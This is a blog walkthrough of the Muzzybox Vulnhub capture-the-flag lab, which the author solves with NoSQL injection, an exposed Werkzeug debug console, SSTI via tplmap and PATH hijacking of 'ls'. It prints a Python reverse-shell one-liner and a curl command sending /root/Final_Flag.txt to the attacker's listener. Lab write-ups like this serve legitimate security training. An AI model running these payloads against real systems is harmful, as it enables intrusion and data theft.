---
date: 2020-06-11 00:00:09
layout: post
title: "Muzzybox Vulnhub Walkthrough"
subtitle:
description: Muzzybox:1 is a boot2root VM from Vulnhub. It consists of 3 challenges, each having a flag of its own.
image: /assets/img/uploads/muzzybox/muzzybox.png
optimized_image: /assets/img/uploads/muzzybox/muzzybox-optimized.png
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: muzzybox, vulnhub, muzzybox writeup, muzzybox walkthorugh, muzzybox vulnhub walkthrough, infosec articles, muzzybox 1 writeup
---

Muzzybox:1 is another boot2root VM from Vulnhub. It was created by Muzzy. It consists of 3 challenges, each having a flag of its own. I’ve added the IP address to my hosts file. Let's Begin!

```r
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.3     muzzybox
```
## Initial Enumeration

As usual, I started with Nmap checking for open ports and default scripts.

```r
root@kali:~# nmap -sC -sV -oA nmap/muzzy muzzybox
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for muzzybox (192.168.1.3)
Host is up (0.00017s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:3c:05:11:e0:2a:5a:34:bf:95:4c:59:0e:86:81:4f (RSA)
|   256 a7:65:d3:5b:e7:9d:56:ad:e4:a9:87:d9:2d:ae:3a:c3 (ECDSA)
|_  256 d5:7e:21:b6:3f:f3:24:7a:2f:b7:b6:6e:59:43:dd:73 (ED25519)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.17)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.17
|_http-title: Directory listing for /
3000/tcp  open  http    Werkzeug httpd 1.0.0 (Python 3.6.9)
|_http-title: Muzzy CTF
15000/tcp open  http    Werkzeug httpd 1.0.0 (Python 3.6.9)
|_http-title: 404 Not Found
MAC Address: 08:00:27:11:2A:E6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
```

We have http server running on 3 different ports. I decided to look at the port 80 first. The index.txt at port 80 shows all the challenges we have to solve in this machine.

<center><br>
<img src="/assets/img/uploads/muzzybox/index.png">
</center>

## Challenge 1

<p align="justify"> The first challenge is to bypass the Washington State University idcard database. The developers of the library have implemented a security measure to prevent unauthorized access. They have used an alternative of SQL DB to secure the database. The process to enter the library is to upload the idcard on this page and then the access is allowed. </p>

<center><br>
<img src="/assets/img/uploads/muzzybox/port3000.png">
</center>

There is a sample ID Card image at <i>http://muzzybox:9633/idcard.png</i> which has a column for Name, Position and Access Level.

<center><br>
<img src="/assets/img/uploads/muzzybox/idcard-sample.png">
</center>

First I tried to upload the id card as such to understand the workflow of the web application. I found that the application reads all the text written on the idcard, and our access level comes to be unauthorized.

<center><br>
<img src="/assets/img/uploads/muzzybox/idcard-upload.png">
</center>

If we look again at the description of the challenge, we can see that only the <b>Principal</b> is authorized.

<center><br>
<img src="/assets/img/uploads/muzzybox/challenge1.png">
</center>

To gain access, to the library, I downloaded the sample ID card image, and changed the 'Position' to <b>Principal</b> and 'Access Level' to <b>authorized</b> in an image editing software (I used GIMP for that) 

<center><br>
<img src="/assets/img/uploads/muzzybox/idcard.png">
</center>

<p align="justify"> Additionally, I also added a `{$ne:1}` with the name because as we know they are using an alternate of SQL DB ie in MongoDB or NoSQL injection, if you supply input with "{$ne:1}" (Logical Operator), the database will dump all users which values are not equal to 1 and it will become True value. The upload was a success and we got our first flag: <br>
<b>N$ctF{D388uG_P!N_!$_123-456-789}</b> </p>

<center><br>
<img src="/assets/img/uploads/muzzybox/challenge1-flag.png">
</center>

## Challenge 2

The next challenge is to exploit their new website which is currently under maintenance. The goal was to list the current directory and read the flag.

<center><br>
<img src="/assets/img/uploads/muzzybox/challenge2.png">
</center>

If we look at the port 8989, there was a python debugger running on the website.

<center><br>
<img src="/assets/img/uploads/muzzybox/port8989.png">
</center>

After clicking on the console button on the right, a popup window came up asking for a pin to use the code. The pin we need was in the previous flag. 

<center><br>
<img src="/assets/img/uploads/muzzybox/console-password.png">
</center>

This opens a console where we can execute any python command. I used the following shellcode to open a reverse shell from the target machine. 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",9001));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

After executing, I got the reverse shell and found a directory named flag. Inside the flag directory, there was a python script named <b>ctf2.py</b>
```r
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...                                                   
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.3] 45062
webpy@muzzy:~$ ls -lah                                                        
ls -lah                                                                       
total 32K                                                                     
drwx------ 4 webpy webpy 4.0K Feb 25 01:40 .     
drwxr-xr-x 7 root  root  4.0K Feb 25 01:24 ..      
-rwx------ 1 webpy webpy  381 Feb 25 01:51 .bash_history   
-rwx------ 1 webpy webpy 3.7K Feb 25 01:15 .bashrc                                 
drwx------ 2 webpy webpy 4.0K Feb 25 01:19 flag                                    
drwx------ 3 webpy webpy 4.0K Feb 25 01:19 .local                                  
-rwx------ 1 webpy webpy  807 Feb 25 01:15 .profile                                
-rwx------ 1 webpy webpy   66 Feb 25 01:26 .selected_editor                        
webpy@muzzy:~$ cd flag         
cd flag    
webpy@muzzy:~/flag$ ls
ls                     
ctf2.py              
```

Our second flag was hidden right inside the script: <br><b>N$cTF{R34D_F!L3_/home/webssti/noflag.txt}</b>

```python
import os
from flask import Flask
app = Flask(__name__)
@app.route('/')
def aws_console():
        print("Welcome to the Muzzy's World")
if __name__ == '__main__':
    # os.environ['WERKZEUG_DEBUG_PIN'] = 'off'
    # os.environ.set('WERKZEUG_DEBUG_PIN') = 'Muzzy'
    # app.secret_key = '123-456-789'
    os.environ['WERKZEUG_DEBUG_PIN'] = '123-456-789'
    app.config['FLAG'] = 'N$cTF{R34D_F!L3_/home/webssti/noflag.txt}'
    app.run(host='0.0.0.0', port=8989, debug=True, threaded=True)

webpy@muzzy:~/flag$ 
```

## Challenge 3

The next challenge is to get root access on the machine by exploiting the <i>ls</i> command.

<center><br>
<img src="/assets/img/uploads/muzzybox/challenge3.png">
</center>

There is a simple web application running at port 15000 which displays the name we provide in the URL. This page is vulnerable to <abbr title="Server Side Template Injection">SSTI</abbr>

<center><br>
<img src="/assets/img/uploads/muzzybox/port15000.png">
</center>

To get a shell on the target machine by exploiting the <abbr title="Server Side Template Injection">SSTI</abbr> Vulnerability, I used a tool named <a href="https://github.com/epinna/tplmap">tplmap.</a> This is available freely on the Github.

```r
root@kali:~/tplmap# python tplmap.py -u "http://muzzybox:15000/page?name=*" --os-shell

...

posix-linux $ id
uid=1003(webssti) gid=1003(webssti) groups=1003(webssti)
posix-linux $ ls
ssti
posix-linux $ ls ssti
injection.py
no_flag.txt
posix-linux $ cat ssti/no_flag.txt
ssh nsctf iamnsce
```

I used ssh credentials from 'no_flag.txt' to login as user nsctf.

```r
root@kali:~# ssh nsctf@muzzybox
nsctf@muzzybox's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * MicroK8s gets a native Windows installer and command-line integration.

     https://ubuntu.com/blog/microk8s-installers-windows-and-macos
Last login: Thu May 28 22:05:38 2020 from 192.168.1.7
nsctf@muzzy:~$ id
uid=1004(nsctf) gid=1004(nsctf) groups=1004(nsctf)
```
<p align="justify"> Next was the Privilege escalation, I found that the user cannot run any command as root. I remembered from the introduction that the root user was using sudo as well as bash with the ls command. So I thought that the path variables had some role to play in this and read the <b>$PATH</b> variable. </p>

```r
nsctf@muzzy:~$ sudo -l
[sudo] password for nsctf: 
Sorry, user nsctf may not run sudo on muzzy.
nsctf@muzzy:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
After this, I enumerated the ls command and found that the directory <b>/usr/local/sbin</b> was writable by the user nstcf.

```r
nsctf@muzzy:~$ which ls
/bin/ls
nsctf@muzzy:~$ ls -la /usr/local/sbin/
total 12
drwxr-xr-x  2 nsctf root  4096 May 28 22:27 .
drwxr-xr-x 10 root  root  4096 Feb 24 23:05 ..
-rw-rw-r--  1 nsctf nsctf   73 May 28 22:27 ls
nsctf@muzzy:~$
```
I used the curl command to send a POST request to the target machine to read the contents of /root/Final_Flag.txt

```r
nsctf@muzzy:~$ nano /usr/local/sbin/ls
```
<center>
<img src="/assets/img/uploads/muzzybox/post-request.png">
</center>

```r
curl -i -X POST "http://192.168.1.5:9000" --data "@/root/Final_Flag.txt"
```

Then I started a netcat listener on my host machine on port 9000 and got the Final Flag.

```r
root@kali:~# nc -lvnp 9000
listening on [any] 9000 ...
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.3] 47832
POST / HTTP/1.1
Host: 192.168.1.5:9000
User-Agent: curl/7.58.0
Accept: */*
Content-Length: 35
Content-Type: application/x-www-form-urlencoded

N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}
```

<p align="justify"> That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future! If you have any queries, you can contact me <a href="/contact">here.</a> </p>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/Jimmy2812">Manh Hung.</a>